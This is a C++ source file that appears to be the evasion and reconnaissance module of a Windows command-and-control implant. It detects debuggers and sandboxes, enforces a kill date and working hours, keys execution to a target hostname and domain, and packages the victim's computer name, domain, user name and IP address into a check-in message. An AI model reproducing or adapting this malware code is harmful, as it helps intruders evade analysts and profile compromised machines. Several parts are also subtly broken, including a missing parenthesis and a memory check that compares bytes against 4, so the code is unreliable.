#include <core/include/opsec.hpp>

using namespace Stream;
using namespace Commands;
using namespace Utils::Time;

namespace Opsec {

    BOOL RuntimeChecks() {
#ifndef DEBUG
        if (CheckDebugger()) {
            Timeout(MINUTES(1));
            return false;
        }
#endif
        if (CheckSandbox()) {
            Timeout(MINUTES(1));
            return false;
        }

        return true;
    }

    BOOL CheckTime() {

        if (Ctx->config.kill_date != 0) {
            if (GetTimeNow() >= Ctx->config.kill_date) {
                Shutdown(nullptr);
            }
        }
        if (Ctx->config.hours) {
            if (!InWorkingHours()) {
                return false;
            }
        }
        return true;
    }

    BOOL CheckDebugger() {
        // todo: diagnose why this stopped working

        PPEB peb    = PEB_POINTER;
        BOOL m_x32  = FALSE;

        PVOID heap_base             = { };
        ULONG flags_offset          = 0;
        ULONG force_flags_offset    = 0;
        BOOL vista_or_greater       = Ctx->session.version >= WIN_VERSION_2008;

        Ctx->win32.IsWow64Process(NtCurrentProcess(), &m_x32);

#if _WIN64
        heap_base = !m_x32 ? C_PTR(*RVA(ULONG_PTR*,peb, 0x18)) : C_PTR(*RVA(ULONG_PTR*,peb, 0x1030));

        flags_offset 		= vista_or_greater ? 0x40 : 0x0C;
        force_flags_offset 	= vista_or_greater ? 0x44 : 0x10;
#else
        heap_base           = C_PTR(*RVA(ULONG_PTR*, peb, 0x30);
        flags_offset        = vista_or_greater ? 0x70 : 0x14;
        force_flags_offset  = vista_or_greater ? 0x74 : 0x18;
#endif
        auto HeapFlags      = RVA(ULONG_PTR*, heap_base, flags_offset);
        auto HeapForceFlags = RVA(ULONG_PTR*, heap_base, force_flags_offset);

        return *HeapFlags & ~HEAP_GROWABLE || *HeapForceFlags != 0;
    }

    BOOL CheckSandbox() {
        // todo: check ACPI tables for vm vendors instead of just checking memory

        MEMORYSTATUSEX stats = { };
        stats.dwLength = sizeof(stats);

        Ctx->win32.GlobalMemoryStatusEx(&stats);
        return stats.ullAvailPhys > 4;
    }

    BOOL CheckEnvironment() {
        // todo: add more information to the checkin message

        _stream *out            = CreateStreamWithHeaders(TypeCheckin);
        IP_ADAPTER_INFO adapter = { };

        unsigned long length    = MAX_PATH;
        char buffer[MAX_PATH]   = { };
        bool success            = true;

        if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &length)) {
            if (Ctx->config.hostname[0]) {
                if (MbsBoundCompare(buffer, Ctx->config.hostname, MbsLength(Ctx->config.hostname)) != 0) {
                    return false;
                }
            }
            PackString(out, buffer);
        }
        else {
            PackUint32(out, 0);
        }

        MemSet(buffer, 0, MAX_PATH);
        length = MAX_PATH;

        if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &length)) {
            if (Ctx->transport.domain[0]) {
                if (MbsBoundCompare(Ctx->transport.domain, buffer, MbsLength(Ctx->transport.domain)) != 0) {
                    return false;
                }
            }
            PackString(out, buffer);
        }
        else {
            PackUint32(out, 0);
        }


        MemSet(buffer, 0, MAX_PATH);
        length = MAX_PATH;

        if (Ctx->win32.GetUserNameA((LPSTR) buffer, &length)) {
            PackString(out, buffer);
        }
        else {
            PackUint32(out, 0);
        }

        MemSet(buffer, 0, MAX_PATH);
        length = sizeof(IP_ADAPTER_INFO);

        if (Ctx->win32.GetAdaptersInfo(&adapter, &length) == NO_ERROR) {
            PackString(out, adapter.IpAddressList.IpAddress.String);
        }
        else {
            PackUint32(out, 0);
        }

        MemSet(&adapter, 0, sizeof(IP_ADAPTER_INFO));

    defer:
        Dispatcher::MessageQueue(out);
        return success;
    }

    BOOL ImageCheckArch(const _executable *const image) {

        if (image->nt_head->Signature != IMAGE_NT_SIGNATURE) {
            ntstatus = ERROR_INVALID_EXE_SIGNATURE;
            return false;
        }
        if (image->nt_head->FileHeader.Machine != MACHINE_ARCH) {
            ntstatus = ERROR_IMAGE_MACHINE_TYPE_MISMATCH;
            return false;
        }

        return true;
    }

    BOOL ImageCheckCompat(const _executable *const source, const _executable *const target) {

        if (target->nt_head->FileHeader.Machine != source->nt_head->FileHeader.Machine) {
            ntstatus = ERROR_IMAGE_MACHINE_TYPE_MISMATCH;
            return false;
        }
        if (target->nt_head->OptionalHeader.Subsystem != source->nt_head->OptionalHeader.Subsystem) {
            ntstatus = ERROR_IMAGE_SUBSYSTEM_NOT_PRESENT;
            return false;
        }

        return true;
    }

}
